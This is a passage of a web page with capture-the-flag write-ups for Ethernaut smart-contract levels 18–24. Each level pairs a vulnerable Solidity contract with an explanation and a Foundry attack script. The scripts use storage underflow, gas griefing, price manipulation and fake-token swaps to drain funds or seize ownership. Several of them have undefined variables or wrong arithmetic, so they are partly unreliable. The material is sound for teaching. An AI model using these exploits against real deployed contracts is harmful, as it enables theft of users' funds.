        console.log("Token Address : ", token);
        console.log("After recover balance : ", wallet.balance);

        vm.stopBroadcast();
    }
}

contract Attack{
    function recover(address payable sender) external pure returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(sender), bytes1(0x01)));
        address addr = address(uint160(uint256(hash)));

        addr.call(abi.encodeWithSignature("destroy(address)", sender));

        return addr;
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/RecoverySolve.s.sol:RecoverySolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 18-MagicNum -->
                <div>
                    <h4>18-MagicNum</h4>
                    <span id="levelBox">MagicNum.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MagicNum {
    address public solver;

    constructor() {}

    function setSolver(address _solver) public {
        solver = _solver;
    }

    /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
    */
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    To solve this level, you only need to provide the Ethernaut with a Solver, a
                                    contract that responds to whatIsTheMeaningOfLife() with the right number.
                                </li>
                                <li>
                                    But the solver contract should be very small at most 10 OPCODES.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                To complete this challenge we have to return <b>42</b>, but he have to solve with very
                                small at most of <b>10 opcodes</b>.
                            </li>
                            <li>
                                Here we have to build smart contract with <b>assembly</b> code then only we can able to
                                write with less opcodes.
                            </li>
                            <li>
                                The first step is to create a minimal smart contract that only return <b>0x2a</b>. No
                                matter
                                what, our code will always and only return <b>42</b>.
                            </li>
                            <li>
                                We can use this creation code to deploy a contract using create opcode and pass the
                                address of the deployed contract to <b>setSolver()</b>.
                            </li>
                        </ul>
                        <div class="container repo">
                            <pre>
Run time code - return 42
602a60005260206000f3

// Store 42 to memory
PUSH1 0x2a   -> pushing 42 into stack
PUSH1 0x00   -> pushing 0 into stack
MSTORE       -> storing 0x2a(42) at 0x00 location

// Return 32 bytes from memory
PUSH1 0x20   -> pushing 32 into stack
PUSH1 0x00   -> pushing 0 into stack
RETURN       -> returns stored value at 0x00 to 0x20 in memory
</pre>
                        </div>

                        <ul>
                            <li>
                                <b>RETURN</b> instruction returns data from memory of given length and present at given
                                offset. So, we have to store the <b>data(magic number)</b> first in memory using
                                <b>MSTORE</b> at some offset and return that using <b>RETURN</b>
                            </li>
                        </ul>
                        <div class="container repo">
                            <pre>
Creation code - return runtime code
69602a60005260206000f3600052600a6016f3

// Store run time code
PUSH10 0X602a60005260206000f3   -> pushing 10 bytes of data into stack
PUSH1 0x00                      -> pushing o into stack
MSTORE                          -> stores runtime bytecode at 0x00 in memory 

// Return 10 bytes from memory starting at offset 22
PUSH1 0x0a    -> push 10 into memory : Length of the run time code
PUSH1 0x16    -> push 22 into memory : Offset position
RETURN        -> Creation Code : 69602a60005260206000f3600052600a6016f3
</pre>
                        </div>
                        <ul>
                            <li>
                                When a smart contract is created (via CREATE or CREATE2 opcode), the EVM will execute
                                the
                                constructor code once and the code of the deployed smart contract will be returned by
                                the
                                <b>RETURN</b> opcode
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">MagicNumSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {MagicNum} from "../src/MagicNum.sol";

contract MagicNumSolve is Script {
    MagicNum public magicNum = MagicNum(0xe0f837ccc4ED52424Dd00063DE97Ad1fE86996a8);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack(magicNum);
        vm.stopBroadcast();
    }
}

contract Attack {
    constructor(MagicNum target) {
        bytes memory bytecode = hex"69602a60005260206000f3600052600a6016f3";
        address addr;

        assembly {
            // create(value, offset, size)
            addr := create(0, add(bytecode, 0x20), 0x13)
        }

        require(addr != address(0));
        target.setSolver(addr);
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/MagicNumSolve.s.sol:MagicNumSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 19-AlienCodex -->
                <div>
                    <h4>19-AlienCodex</h4>
                    <span id="levelBox">AlienCodex.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "@openzeppelin/contracts/access/Ownable.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    You've uncovered an Alien contract. Claim ownership to complete the level.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                In this challenge uses <b>0.5.0</b> pragma verison which has no <b>Arithmetic
                                    overflow/underflow</b> checks by default.
                            </li>
                            <li>
                                AleinCodex contract <b>inhereit</b> Ownable contract, the owner variable is stored at
                                <b>slot-0</b>.
                            </li>
                            <li>
                                To call any function on the contract we need to call the <b>makeContact()</b> function
                                initially.
                            </li>
                            <li>
                                In codex dynamic array allocates <b>slot-1</b> which stores the <b>length</b> of the
                                array.
                            </li>
                            <li>
                                AleinCodex also changes the length of the codex with <b>retract()</b> function.
                            </li>
                            <li>
                                Initially the length of the codex is <b>0</b>. If we call the retract() it will be <b>0
                                    - 1</b> which
                                results in underflow and stores the value <b>2**256 - 1</b> as the length . It is the
                                maximum
                                storage slot index of a contract in ethereum.
                            </li>
                            <li>
                                So, now the codex array has access to all the storage slots of the contract. We can use
                                this to update the owner value which is stored at the slot 0.
                            </li>
                            <li>
                                For this we need to find the index of the slot 0. Dynamic arrays finds the elements
                                starting from the slot number <b>uint(keccak256( SLOT_NUMBER_OF_LENGTH))</b>. So, the
                                codex
                                array elements starts from the slot <b>uint(keccak256(1))</b>.
                            </li>
                        </ul>
                        <div class="repo">
                            <pre>
<b>storage layout</b>
slot 0 - owner (20 bytes), contact (1 byte)
slot 1 - length of the array codex

// slot where array element is stored = keccak256(slot) + index
// h = keccak256(1)
slot h + 0 - codex[0]
slot h + 1 - codex[1]
slot h + 2 - codex[2]
slot h + 3 - codex[3]

Find i such that
slot h + i = slot 0
h + i = 0 so i = 0 - h
                                </pre>
                        </div>
                        <ul>
                            <li>
                                We need to find the index of the <b>slot 0</b>. We can do this by pointing our codex
                                array to
                                <b>2**256 index</b>, which is not available and result in an <b>overflow</b> and will
                                points back to
                                the <b>slot 0</b>.
                            </li>
                            <li>
                                So, we need pass the <b>2**256 - keccack256(1)</b> to the <b>revise()</b> method it will
                                find the
                                index of the slot by using the same method.
                            </li>
                            <li>
                                This will result a <b>overflow</b> and <b>revise()</b> method will modify the content of
                                the owner
                                slot that is zero.
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">AlienCodexSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {AleinCodex} from "../src/AleinCodex.sol";

contract AleinCodexSolve is Script {
    AleinCodex public aleinCodex = AleinCodex(0xe0f837ccc4ED52424Dd00063DE97Ad1fE86996a8);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.log("Initial owner : ", aleinCodex.owner());

        Attack attack = new Attack(aleinCodex);

        console.log("New owner : ", aleinCodex.owner());
        console.log("Attacker address : ", address(alienCodex));

        vm.stopBroadcast();
    }
}

contract Attack {
    
    constructor(AlienCodex target) {
        target.make_contact();
        target.retract();

        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i;
        unchecked {
            // h + i = 0 = 2**256
            i -= h;
        }

        target.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(target.owner() == msg.sender, "hack failed");
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/AlienCodexSolve.s.sol:AlienCodexSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 20-Denial -->
                <div>
                    <h4>20-Denial</h4>
                    <span id="levelBox">Denial.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    This is a simple wallet that drips funds over time. You can withdraw the funds
                                    slowly by becoming a withdrawing partner.
                                </li>
                                <li>
                                    If you can deny the owner from withdrawing funds when they call withdraw() (whilst
                                    the contract still has funds, and the transaction is of 1M gas or less) you will win
                                    this level.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                The only options we have is to do something bad in the external call made to the
                                <b>partner
                                    address</b>.
                            </li>
                            <li>
                                Simply reverting doesn't solve the challenge, so we have to consume all the gas for that
                                transcation.
                            </li>
                            <li>
                                Here we introduce most expensive computation <b>infinite loop</b> that consume all the
                                gas for
                                it.
                            </li>
                            <li>
                                When the withdraw function in <b>Denial</b> contract will transfer amountToSend to the
                                <b>partner</b>
                                the <b>Exploiter.receive</b> function will be executed and as a consequence, the
                                transaction
                                will <b>revert</b> because of the infinite loop inside the <b>exploit()</b> function.
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">DenialSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Denial} from "../src/Denial.sol";

contract DenialSolve is Script {
    Denial public denial = Denial(0xBd6502E57D34584A8CE00aea0a0D40A219a168A4);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        Attack attack = new Attack(denial);

        vm.stopBroadcast();
    }
}

contract Attack {
    constructor(Denial target) {
        target.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        for (uint i = 0; i>=0; i++){
            x = x + i;
        }
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/DenialSolve.s.sol:DenialSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 21-Shop -->
                <div>
                    <h4>21-Shop</h4>
                    <span id="levelBox">Shop.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    The goal of this challenge is to get the item from the shop for less than the price
                                    asked.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                This is similar to the <b>Elevator</b> contract. Both uses an external normal function
                                to call.
                            </li>
                            <li>
                                Here i check the <b>isSold</b> variable and if the <b>second</b> call of price()
                                function i will return with <b>less</b> price and at <b>first</b> called i will return
                                the <b>fixed</b> price given by the Shop contract.
                            </li>
                            <li>
                                For updating of price values i will use <b>isSold</b> variable that is first call of
                                <b>price()</b> is called or not.
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">ShopSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Shop} from "../src/Shop.sol";

contract ShopSolve is Script {
    Shop public shop = Shop(0x29691f13DBF03b0827bae2Fd1cB43639B3F3da3F);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Is item sold : ", shop.isSold());

        new Attack(shop).attack();

        console.log("Is item sold : ", shop.isSold());        
        vm.stopBroadcast();
    }
}

contract Attack {
    Shop private immutable target;

    constructor(Shop _target) {
        target = _target;
    }

    function attack() external {
        target.buy();
        require(target.price() == 1, "price != 1");
    }

    function price() external view returns (uint256) {
        if (target.isSold()) {
            return 1;
        }
        return 100;
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/ShopSolve.s.sol:ShopSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 22-Dex -->
                <div>
                    <h4>22-Dex</h4>
                    <span id="levelBox">Dex.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    The goal of this level is for you to hack the basic DEX contract below and steal the
                                    funds by price manipulation.
                                </li>
                                <li>
                                    You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts
                                    with 100 of each token.
                                </li>
                                <li>
                                    You will be successful in this level if you manage to drain all of at least 1 of the
                                    2 tokens from the contract, and allow the contract to report a "bad" price of the
                                    assets.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                In Dex contract we can swap the tokens using <b>swap()</b> function. If we go inside the
                                function there are some checks for correct tokens are swapping.
                            </li>
                            <li>
                                We can observe the <b>getSwapPrice()</b> using to get the price of a token in the pool.
                            </li>
                            <li>
                                Using the balance as a factor to calculate the price will make your contract keen to an
                                attack called <b>price manipulation</b>.
                            </li>
                            <li>
                                The formula used to calculate the amount of token that the user will receive as the
                                result of the swap operation is this
                            </li>
                            <div class="repo">
                                <pre>
amount_out = ((amount_in * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)))
                                </pre>
                            </div>
                            <li>
                                Due to very less amount we can observe the <b>rounding issues</b>, which all integer
                                division
                                rounds down to the nearest integer. This mean that if you perform 5/2 the result won't
                                be 2.5 but 2.
                            </li>
                            <li>
                                Here you can see that the after each swap swapAmount is becoming <b>greater</b> than the
                                amount
                                the comes in.
                            </li>
                            <div class="repo" style="float: left;">
                                <pre>
swap-1
swap(token1, token2, 10);
amount_out = (10 * 100) / 100
amount_out = 10

token1 balance in pool = 110
token2 balance in pool = 90

player balance of token1 = 0
player balance of token2 = 20
                                </pre>
                            </div>

                            <div class="repo" style="float: left;">
                                <pre>
swap-2
swap(token2, token1, 20);
amount_out = (20 * 110) / 90
amount_out = 24

token1 balance in pool = 86
token2 balance in pool = 110

player balance of token1 = 24
player balance of token2 = 0
                                </pre>
                            </div>

                            <div class="repo">
                                <pre>
swap-3
swap(token1, token2, 24);
amount_out = (10 * 100) / 100
amount_out = 30

token1 balance in pool = 110
token2 balance in pool = 80

player balance of token1 = 0
player balance of token2 = 30
                                </pre>
                            </div>

                            <li>
                                After doing <b>5 swaps</b> we need to do <b>45 amount</b> of tokens swap from token2 to
                                token1 which
                                will make token2 balance of Dex zero.
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">DexSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Dex} from "../src/Dex.sol";

contract DexSolve is Script {
    Dex public dex = Dex(0x1596815349F03F2816b8731F568dE7686EeC5af3);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Is item sold : ", shop.isSold());

        new Attack(dex).attack();

        console.log("Is item sold : ", shop.isSold());        
        vm.stopBroadcast();
    }
}

contract Attack{
    Dex private immutable dex;
    IERC20 private immutable token1;
    IERC20 private immutable token2;

    constructor(Dex _dex) {
        dex = _dex;
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function attack() external {
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        token1.approve(address(dex), type(uint256).max);
        token2.approve(address(dex), type(uint256).max);

        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);

        dex.swap(address(token2), address(token1), 45);

        require(token1.balanceOf(address(dex)) == 0, "dex token1 balance != 0");
    }

    //      token 1 | token 2
    // 10 in  | 100 | 100 | 10 out
    // 24 out | 110 |  90 | 20 in
    // 24 in  |  86 | 110 | 30 out
    // 41 out | 110 |  80 | 30 in
    // 41 in  |  69 | 110 | 65 out
    //        | 110 |  45 | 45 in

    // math for last swap
    // 110 = token2 amount in * token1 balance / token2 balance
    // 110 = token2 amount in * 110 / 45
    // 45  = token2 amount in

    function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
        dex.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this)));
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/DexSolve.s.sol:DexSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 23-DexTwo -->
                <div>
                    <h4>23-DexTwo</h4>
                    <span id="levelBox">DexTwo.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    This level will ask you to break DexTwo, a subtlely modified Dex contract from the
                                    previous level, in a different way.
                                </li>
                                <li>
                                    You need to drain all balances of token1 and token2 from the DexTwo contract to
                                    succeed in this level.
                                </li>
                                <li>
                                    You will still start with 10 tokens of token1 and 10 of token2. The DEX contract
                                    still starts with 100 of each token.
                                </li>
                            </ul>
                        </span>

                        <h5>>> Solution : </h5>
                        <ul>
                            <li>
                                We can observe that the current swap function is <b>not checking</b> that from and to
                                are
                                actually the whitelisted token1 and token2 tokens handled by the DexTwo contract.
                            </li>
                            <li>
                                This allows an attacker to call the swap function, selling an <b>arbitrary</b> from
                                token to
                                get the "real" to token from the Dex.
                            </li>
                            <li>
                                We drain the DexTwo contract token1 and token2 with one call each. To do so, we need to
                                find the correct amount of fakeToken to sell to get back 100 token1.
                            </li>
                            <li>
                                The main bug we can find in <b>getSwapAmount()</b>, here we can manipulate the <b>price
                                    oracle</b>.
                            </li>
                            <div class="repo">
                                <pre>
amount out = ((amount_in * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));

let swap token1 with my FakeToken1 with 100 token1 and 1 FakeToken1
then amount1 out = (1 * 100) / 1;
amount1 out = 100

let do the same for token2, by swapping for 100 token2 with 1 FakeToken2
then amount2 out = (1 * 100) / 1;
amount2 out = 100
</pre>
                            </div>
                            <li>
                                By sending <b>1 FakeToken1</b> to the DexTwo contract to give it some liquidity, we can
                                swap
                                <b>100 FakeToken</b> to get back <b>100 token1</b>. After that, we just need to repeat
                                the same
                                operation with another instance of FakeToken2 and drain all the token2 from the Dex.
                            </li>
                        </ul>
                    </div>
                    <br>

                    <span id="levelBox">DexTwoSolve.s.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {DexTwo} from "../src/DexTwo.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract DexTwoSolve is Script {
    DexTwo public dexTwo = DexTwo(0x5F0Eb0b2913Af7878A09f955249804630F3e28c2);

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("DEX balance in TOKEN1 ", dex.balanceOf(token1, address(dex)));
        console.log("DEX balance in TOKEN2 ", dex.balanceOf(token2, address(dex)));

        Attack attack = new Attack(dexTwo);
        attack.attack();

        console.log("Attacker balance in TOKEN1 ", dex.balanceOf(token1, address(attack)));
        console.log("Attacker balance in TOKEN2 ", dex.balanceOf(token2, address(attack)));

        console.log("DEX balance in TOKEN1 ", dex.balanceOf(token1, address(dex)));
        console.log("DEX balance in TOKEN2 ", dex.balanceOf(token2, address(dex)));
     
        vm.stopBroadcast();
    }
}

contract Attack {
    DexTwo public dex;
    IERC20 public token1;
    IERC20 public token2;

    constructor(DexTwo _dex) {
        dex = _dex;
        IERC20 token1 = IERC20(dex.token1());
        IERC20 token2 = IERC20(dex.token2());

        MyToken myToken1 = new MyToken();
        MyToken myToken2 = new MyToken();
    }

    function attack() external {
        myToken1.transfer(address(dex), 1);
        myToken2.transfer(address(dex), 1);

        myToken1.approve(address(dex), 1);
        myToken2.approve(address(dex), 1);

        dex.swap(address(myToken1), address(token1), 1);
        dex.swap(address(myToken2), address(token2), 1);

        require(token1.balanceOf(address(dex)) == 0, "dex token1 balance != 0");
        require(token2.balanceOf(address(dex)) == 0, "dex token2 balance != 0");
    }
}

contract MyToken is ERC20 {
    constructor() ERC20("My-Token", "MTK") {
        _mint(msg.sender, 10000);
    }
}
</code>
                </pre>
                    </div>

                    <h5>>> Run script : </h5>
                    <div class="repo">
                        <span>$ source .env</span><br>
                        <span>$ forge script script/DexTwoSolve.s.sol:DexTwoSolve --rpc-url $RPC_URL
                            --broadcast</span>
                    </div>
                </div>
                <hr class="breakLine">

                <!-- 24-PuzzleWallet -->
                <div>
                    <h4>24-PuzzleWallet</h4>
                    <span id="levelBox">PuzzleWallet.sol</span>
                    <div class="container" id="code">
                        <pre>
<code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pendingadmin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
</code>
</pre>
                    </div>

                    <div>
                        <h5>>> Goal :</h5>
                        <span>
                            <ul>
                                <li>
                                    A group of friends discovered how to slightly decrease the cost of performing
                                    multiple transactions by batching them in one transaction, so they developed a smart
                                    contract for doing this.
                                </li>
                                <li>
                                    They needed this contract to be upgradeable in case the code contained a bug, and
                                    they also wanted to prevent people from outside the group from using it. To do so,
                                    they voted and assigned two people with special roles in the system.
                                </li>
                                <li>
                                    The admin, which has the power of updating the logic of the smart contract. The
                                    owner, which controls the whitelist of addresses allowed to use the contract. The
                                    contracts were deployed, and the group was whitelisted. Everyone cheered for their
